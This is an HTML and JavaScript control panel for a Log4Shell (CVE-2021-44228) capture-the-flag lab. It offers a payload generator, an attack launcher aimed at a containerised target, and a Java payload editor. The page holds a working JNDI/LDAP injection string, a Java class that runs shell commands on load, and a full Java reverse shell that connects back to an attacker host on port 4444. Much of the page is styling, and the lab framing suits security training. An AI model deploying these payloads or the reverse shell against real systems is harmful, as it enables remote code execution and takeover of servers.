<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log4Shell CTF Lab - CVE-2021-44228</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap');
        
        :root {
            --bg-primary: #0B0F14;
            --bg-secondary: #0F1A2B;
            --bg-card: #121923;
            --accent-primary: #D41414;
            --accent-primary-hover: #FF2A2A;
            --accent-secondary: #1F6AFF;
            --glow-color: #00C2FF;
            --accent-danger: #ff3366;
            --accent-warning: #ffaa00;
            --text-primary: #F2F4F8;
            --text-secondary: #8A8F98;
            --border-color: #223247;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            --glow: 0 0 20px rgba(0, 194, 255, 0.32);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Animated Background */
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: 
                radial-gradient(circle at 20% 50%, rgba(212, 20, 20, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(0, 194, 255, 0.08) 0%, transparent 50%);
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.03;
            pointer-events: none;
        }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-card) 100%);
            border-bottom: 2px solid var(--border-color);
            padding: 20px 0;
            box-shadow: var(--shadow);
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(10px);
        }
        
        .header-content {
            max-width: 1600px;
            margin: 0 auto;
            padding: 0 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-icon {
            font-size: 2.5em;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .logo-text h1 {
            font-size: 1.8em;
            font-weight: 700;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .logo-text p {
            color: var(--text-secondary);
            font-size: 0.9em;
            font-family: 'Fira Code', monospace;
        }
        
        .header-stats {
            display: flex;
            gap: 30px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.8em;
            font-weight: 700;
            color: var(--accent-primary);
            font-family: 'Fira Code', monospace;
        }
        
        .stat-label {
            font-size: 0.85em;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Container */
        .container {
            max-width: 1600px;
            margin: 30px auto;
            padding: 0 30px;
        }
        
        /* Grid Layout */
        .grid {
            display: grid;
            grid-template-columns: repeat(12, 1fr);
            gap: 25px;
            margin-bottom: 25px;
        }
        
        /* Cards */
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 25px;
            box-shadow: var(--shadow);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 194, 255, 0.22);
            border-color: var(--accent-primary);
        }
        
        .card:hover::before {
            opacity: 1;
        }
        
        .card-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }
        
        .card-icon {
            font-size: 1.5em;
            color: var(--accent-primary);
        }
        
        .card-title {
            font-size: 1.3em;
            font-weight: 600;
            color: var(--text-primary);
        }
        
        /* Grid Sizes */
        .col-4 { grid-column: span 4; }
        .col-6 { grid-column: span 6; }
        .col-8 { grid-column: span 8; }
        .col-12 { grid-column: span 12; }
        
        @media (max-width: 1200px) {
            .col-4, .col-6, .col-8 { grid-column: span 12; }
        }
        
        /* Buttons */
        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.2);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-primary-hover));
            color: var(--bg-primary);
            box-shadow: 0 4px 15px rgba(0, 194, 255, 0.3);
        }
        
        .btn-primary:hover {
            box-shadow: 0 6px 25px rgba(0, 194, 255, 0.45);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--accent-danger), #cc0044);
            color: white;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.3);
        }
        
        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, var(--accent-warning), #ff8800);
            color: var(--bg-primary);
        }
        
        .btn-block {
            width: 100%;
            justify-content: center;
            margin-top: 10px;
        }
        
        /* Inputs */
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-size: 0.9em;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 16px;
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            font-size: 1em;
            font-family: 'Fira Code', monospace;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 3px rgba(0, 194, 255, 0.16);
        }
        
        textarea.form-control {
            min-height: 200px;
            resize: vertical;
            font-size: 0.9em;
        }
        
        /* Status Indicators */
        .status-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px;
            background: var(--bg-secondary);
            border-radius: 8px;
            border-left: 3px solid var(--accent-primary);
            transition: all 0.3s;
        }
        
        .status-item:hover {
            background: rgba(0, 194, 255, 0.06);
        }
        
        .status-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            animation: blink 2s infinite;
        }
        
        .status-dot.online {
            background: var(--accent-primary);
            box-shadow: 0 0 10px var(--accent-primary);
        }
        
        .status-dot.offline {
            background: var(--accent-danger);
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .status-name {
            font-family: 'Fira Code', monospace;
            font-size: 0.95em;
        }
        
        .badge {
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 0.85em;
            font-weight: 600;
            font-family: 'Fira Code', monospace;
        }
        
        .badge-success {
            background: rgba(212, 20, 20, 0.16);
            color: var(--accent-primary);
            border: 1px solid var(--accent-primary);
        }
        
        .badge-danger {
            background: rgba(255, 51, 102, 0.2);
            color: var(--accent-danger);
            border: 1px solid var(--accent-danger);
        }
        
        /* Terminal/Log */
        .terminal {
            background: #000;
            border-radius: 8px;
            padding: 20px;
            font-family: 'Fira Code', monospace;
            font-size: 0.9em;
            max-height: 400px;
            overflow-y: auto;
            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
        }
        
        .terminal::-webkit-scrollbar {
            width: 8px;
        }
        
        .terminal::-webkit-scrollbar-track {
            background: #111;
        }
        
        .terminal::-webkit-scrollbar-thumb {
            background: var(--accent-primary);
            border-radius: 4px;
        }
        
        .terminal-line {
            margin-bottom: 8px;
            padding: 8px;
            border-left: 2px solid var(--accent-primary);
            background: rgba(0, 194, 255, 0.06);
            border-radius: 4px;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .terminal-time {
            color: var(--accent-secondary);
            font-weight: 700;
        }
        
        .terminal-text {
            color: var(--accent-primary);
        }
        
        .terminal-error {
            color: var(--accent-danger);
        }
        
        /* Payload Display */
        .payload-display {
            background: var(--bg-secondary);
            border: 1px solid var(--accent-primary);
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Fira Code', monospace;
            word-break: break-all;
            position: relative;
        }
        
        .payload-display::before {
            content: 'PAYLOAD';
            position: absolute;
            top: -10px;
            left: 15px;
            background: var(--bg-card);
            padding: 2px 10px;
            font-size: 0.75em;
            color: var(--accent-primary);
            font-weight: 700;
        }
        
        .copy-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: var(--accent-primary);
            color: var(--bg-primary);
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.3s;
        }
        
        .copy-btn:hover {
            background: var(--accent-secondary);
        }
        
        /* Alerts */
        .alert {
            padding: 15px 20px;
            border-radius: 8px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.3s ease;
        }
        
        .alert-success {
            background: rgba(212, 20, 20, 0.12);
            border-left: 4px solid var(--accent-primary);
            color: var(--accent-primary);
        }
        
        .alert-error {
            background: rgba(255, 51, 102, 0.1);
            border-left: 4px solid var(--accent-danger);
            color: var(--accent-danger);
        }
        
        .alert-warning {
            background: rgba(255, 170, 0, 0.1);
            border-left: 4px solid var(--accent-warning);
            color: var(--accent-warning);
        }
        
        /* Progress Bar */
        .progress-bar {
            width: 100%;
            height: 6px;
            background: var(--bg-secondary);
            border-radius: 3px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
            animation: progress 2s ease-in-out infinite;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 100%; }
            100% { width: 0%; }
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 2px solid var(--border-color);
        }
        
        .tab {
            padding: 12px 24px;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
            border-bottom: 3px solid transparent;
        }
        
        .tab.active {
            color: var(--accent-primary);
            border-bottom-color: var(--accent-primary);
        }
        
        .tab:hover {
            color: var(--text-primary);
        }
        
        /* Loading Spinner */
        .spinner {
            border: 3px solid var(--bg-secondary);
            border-top: 3px solid var(--accent-primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* Tooltip */
        .tooltip {
            position: relative;
            display: inline-block;
        }
        
        .tooltip .tooltiptext {
            visibility: hidden;
            background-color: var(--bg-secondary);
            color: var(--text-primary);
            text-align: center;
            border-radius: 6px;
            padding: 8px 12px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: opacity 0.3s;
            font-size: 0.85em;
            white-space: nowrap;
            border: 1px solid var(--border-color);
        }
        
        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="bg-animation"></div>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <!-- Header -->
    <header class="header">
        <div class="header-content">
            <div class="logo">
                <div class="logo-icon">🔥</div>
                <div class="logo-text">
                    <h1>Log4Shell CTF Lab</h1>
                    <p>CVE-2021-44228 Exploitation Platform</p>
                </div>
            </div>
            <div class="header-stats">
                <div class="stat-item">
                    <div class="stat-value" id="attack-count">0</div>
                    <div class="stat-label">Attacks</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="success-count">0</div>
                    <div class="stat-label">Success</div>
                </div>
                <div class="stat-item">
                    <div class="stat-value" id="shell-count">0</div>
                    <div class="stat-label">Shells</div>
                </div>
            </div>
        </div>
    </header>
    
    <!-- Main Container -->
    <div class="container">
        <!-- Row 1: Status & Quick Actions -->
        <div class="grid">
            <div class="card col-4">
                <div class="card-header">
                    <i class="fas fa-server card-icon"></i>
                    <h2 class="card-title">Infrastructure Status</h2>
                </div>
                <div class="status-list" id="container-status">
                    <div class="status-item">
                        <div class="status-info">
                            <div class="status-dot offline"></div>
                            <span class="status-name">Loading...</span>
                        </div>
                    </div>
                </div>
                <button class="btn btn-primary btn-block" onclick="startContainers()">
                    <i class="fas fa-play"></i> Start Lab
                </button>
                <button class="btn btn-danger btn-block" onclick="stopContainers()">
                    <i class="fas fa-stop"></i> Stop Lab
                </button>
                <button class="btn btn-secondary btn-block" onclick="checkStatus()">
                    <i class="fas fa-sync"></i> Refresh
                </button>
            </div>
            
            <div class="card col-4">
                <div class="card-header">
                    <i class="fas fa-bolt card-icon"></i>
                    <h2 class="card-title">Payload Generator</h2>
                </div>
                <div class="form-group">
                    <label class="form-label">LDAP Host</label>
                    <input type="text" class="form-control" id="attacker-ip" value="ldap">
                </div>
                <div class="form-group">
                    <label class="form-label">LDAP Port</label>
                    <input type="number" class="form-control" id="port" value="1389">
                </div>
                <div class="form-group">
                    <label class="form-label">Payload Type</label>
                    <select class="form-control" id="payload-type">
                        <option value="simple">Simple Test</option>
                        <option value="reverse_shell">Reverse Shell</option>
                    </select>
                </div>
                <button class="btn btn-primary btn-block" onclick="generatePayload()">
                    <i class="fas fa-code"></i> Generate
                </button>
                <div id="generated-payload"></div>
            </div>
            
            <div class="card col-4">
                <div class="card-header">
                    <i class="fas fa-rocket card-icon"></i>
                    <h2 class="card-title">Attack Control</h2>
                </div>
                <div class="form-group">
                    <label class="form-label">Target</label>
                    <input type="text" class="form-control" id="target" value="vulnerable:8080">
                </div>
                <div class="form-group">
                    <label class="form-label">Payload</label>
                    <input type="text" class="form-control" id="attack-payload" value="${jndi:ldap://ldap:1389/Rev}">
                </div>
                <button class="btn btn-warning btn-block" onclick="startWebServer()">
                    <i class="fas fa-globe"></i> Start Web Server
                </button>
                <button class="btn btn-danger btn-block" onclick="launchAttack()">
                    <i class="fas fa-crosshairs"></i> Launch Attack
                </button>
                <div id="attack-result"></div>
            </div>
        </div>
        
        <!-- Row 2: Payload Editor -->
        <div class="grid">
            <div class="card col-12">
                <div class="card-header">
                    <i class="fas fa-code card-icon"></i>
                    <h2 class="card-title">Custom Java Payload Editor</h2>
                </div>
                <div class="tabs">
                    <button class="tab active" onclick="switchTab('simple')">Simple Payload</button>
                    <button class="tab" onclick="switchTab('reverse')">Reverse Shell</button>
                    <button class="tab" onclick="switchTab('custom')">Custom Code</button>
                </div>
                <textarea class="form-control" id="java-code">public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = {"/bin/sh", "-c", "touch /tmp/pwned && echo 'Pwned by Farahrex' > /tmp/pwned"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {}
    }
}</textarea>
                <button class="btn btn-primary" onclick="compilePayload()">
                    <i class="fas fa-hammer"></i> Compile Payload
                </button>
                <div id="compile-result"></div>
            </div>
        </div>
        
        <!-- Row 3: Attack Log -->
        <div class="grid">
            <div class="card col-12">
                <div class="card-header">
                    <i class="fas fa-terminal card-icon"></i>
                    <h2 class="card-title">Attack Log & Terminal</h2>
                </div>
                <button class="btn btn-secondary" onclick="refreshLog()">
                    <i class="fas fa-sync"></i> Refresh Log
                </button>
                <button class="btn btn-secondary" onclick="clearLog()">
                    <i class="fas fa-trash"></i> Clear Log
                </button>
                <div class="terminal" id="attack-log">
                    <div class="terminal-line">
                        <span class="terminal-time">[00:00:00]</span>
                        <span class="terminal-text"> System initialized. Waiting for attacks...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Matrix Background Animation
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = '01';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00C2FF';
            ctx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 50);
        
        // Stats
        let attackCount = 0;
        let successCount = 0;
        let shellCount = 0;
        
        function updateStats() {
            document.getElementById('attack-count').textContent = attackCount;
            document.getElementById('success-count').textContent = successCount;
            document.getElementById('shell-count').textContent = shellCount;
        }
        
        // Initialize
        window.onload = function() {
            checkStatus();
            setInterval(refreshLog, 5000);
        };
        
        function checkStatus() {
            fetch('/api/status')
                .then(r => r.json())
                .then(data => {
                    const container = document.getElementById('container-status');
                    if (data.status === 'success' && data.containers.length > 0) {
                        container.innerHTML = data.containers.map(c => `
                            <div class="status-item">
                                <div class="status-info">
                                    <div class="status-dot ${c.status.includes('Up') ? 'online' : 'offline'}"></div>
                                    <span class="status-name">${c.name}</span>
                                </div>
                                <span class="badge ${c.status.includes('Up') ? 'badge-success' : 'badge-danger'}">
                                    ${c.status.includes('Up') ? 'ONLINE' : 'OFFLINE'}
                                </span>
                            </div>
                        `).join('');
                    } else {
                        container.innerHTML = `
                            <div class="status-item">
                                <div class="status-info">
                                    <div class="status-dot offline"></div>
                                    <span class="status-name">No containers running</span>
                                </div>
                                <span class="badge badge-danger">OFFLINE</span>
                            </div>
                        `;
                    }
                });
        }
        
        function startContainers() {
            showAlert('Starting containers...', 'warning');
            fetch('/api/start-containers', {method: 'POST'})
                .then(r => r.json())
                .then(data => {
                    showAlert(data.message, data.status === 'success' ? 'success' : 'error');
                    setTimeout(checkStatus, 3000);
                });
        }
        
        function stopContainers() {
            showAlert('Stopping containers...', 'warning');
            fetch('/api/stop-containers', {method: 'POST'})
                .then(r => r.json())
                .then(data => {
                    showAlert(data.message, data.status === 'success' ? 'success' : 'error');
                    checkStatus();
                });
        }
        
        function generatePayload() {
            const ip = document.getElementById('attacker-ip').value;
            const port = document.getElementById('port').value;
            const type = document.getElementById('payload-type').value;
            
            fetch('/api/generate-payload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ip, port, type})
            })
            .then(r => r.json())
            .then(data => {
                document.getElementById('generated-payload').innerHTML = `
                    <div class="payload-display">
                        ${data.payload}
                        <button class="copy-btn" onclick="copyToClipboard('${data.payload}')">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                `;
                document.getElementById('attack-payload').value = data.payload;
                showAlert('Payload generated successfully!', 'success');
            });
        }
        
        function startWebServer() {
            fetch('/api/start-webserver', {method: 'POST'})
                .then(r => r.json())
                .then(data => showAlert(data.message, data.status === 'success' ? 'success' : 'error'));
        }
        
        function launchAttack() {
            const target = document.getElementById('target').value;
            const payload = document.getElementById('attack-payload').value;
            
            attackCount++;
            updateStats();
            
            addLogEntry('Launching attack...', 'warning');
            
            fetch('/api/launch-attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target, payload})
            })
            .then(r => r.json())
            .then(data => {
                if (data.status === 'success') {
                    successCount++;
                    shellCount++;
                    updateStats();
                    addLogEntry(`Attack successful! Target: ${target}`, 'success');
                    showAlert('Attack launched successfully!', 'success');
                } else {
                    addLogEntry(`Attack failed: ${data.message}`, 'error');
                    showAlert('Attack failed!', 'error');
                }
                refreshLog();
            });
        }
        
        function compilePayload() {
            const code = document.getElementById('java-code').value;
            
            addLogEntry('Compiling payload...', 'warning');
            
            fetch('/api/compile-payload', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({code})
            })
            .then(r => r.json())
            .then(data => {
                const result = document.getElementById('compile-result');
                if (data.status === 'success') {
                    result.innerHTML = `<div class="alert alert-success"><i class="fas fa-check-circle"></i> ${data.message}</div>`;
                    addLogEntry('Payload compiled successfully', 'success');
                } else {
                    result.innerHTML = `<div class="alert alert-error"><i class="fas fa-times-circle"></i> ${data.message}</div>`;
                    addLogEntry('Compilation failed', 'error');
                }
            });
        }
        
        function refreshLog() {
            fetch('/api/attack-log')
                .then(r => r.json())
                .then(data => {
                    const log = document.getElementById('attack-log');
                    if (data.log && data.log.length > 0) {
                        log.innerHTML = data.log.slice().reverse().map(entry => `
                            <div class="terminal-line">
                                <span class="terminal-time">[${entry.time}]</span>
                                <span class="terminal-text"> Target: ${entry.target} | Payload: ${entry.payload}</span>
                            </div>
                        `).join('');
                    }
                });
        }
        
        function clearLog() {
            document.getElementById('attack-log').innerHTML = `
                <div class="terminal-line">
                    <span class="terminal-time">[${new Date().toLocaleTimeString()}]</span>
                    <span class="terminal-text"> Log cleared</span>
                </div>
            `;
        }
        
        function addLogEntry(message, type) {
            const log = document.getElementById('attack-log');
            const time = new Date().toLocaleTimeString();
            const className = type === 'error' ? 'terminal-error' : 'terminal-text';
            
            const entry = document.createElement('div');
            entry.className = 'terminal-line';
            entry.innerHTML = `
                <span class="terminal-time">[${time}]</span>
                <span class="${className}"> ${message}</span>
            `;
            
            log.insertBefore(entry, log.firstChild);
        }
        
        function showAlert(message, type) {
            const alertClass = `alert-${type}`;
            const icon = type === 'success' ? 'check-circle' : type === 'error' ? 'times-circle' : 'exclamation-triangle';
            
            const alert = document.createElement('div');
            alert.className = `alert ${alertClass}`;
            alert.innerHTML = `<i class="fas fa-${icon}"></i> ${message}`;
            
            document.querySelector('.container').insertBefore(alert, document.querySelector('.grid'));
            
            setTimeout(() => alert.remove(), 5000);
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text);
            showAlert('Copied to clipboard!', 'success');
        }
        
        function switchTab(tab) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            const templates = {
                simple: `public class Rev {
    public Rev() {}
    static {
        try {
            String[] cmds = {"/bin/sh", "-c", "touch /tmp/pwned && echo 'Pwned by Farahrex' > /tmp/pwned"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {}
    }
}`,
                reverse: `import java.io.*;
import java.net.*;

public class Rev {
    public Rev() {}
    static {
        try {
            String host = "${document.getElementById('attacker-ip').value || 'host.docker.internal'}";
            int port = ${document.getElementById('port').value || 4444};
            Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while(!s.isClosed()) {
                while(pi.available()>0) so.write(pi.read());
                while(pe.available()>0) so.write(pe.read());
                while(si.available()>0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try { p.exitValue(); break; } catch (Exception e){}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}`,
                custom: `// Your custom payload here
public class Rev {
    public Rev() {}
    static {
        try {
            // Add your code here
        } catch (Exception e) {}
    }
}`
            };
            
            document.getElementById('java-code').value = templates[tab];
        }
    </script>
</body>
</html>
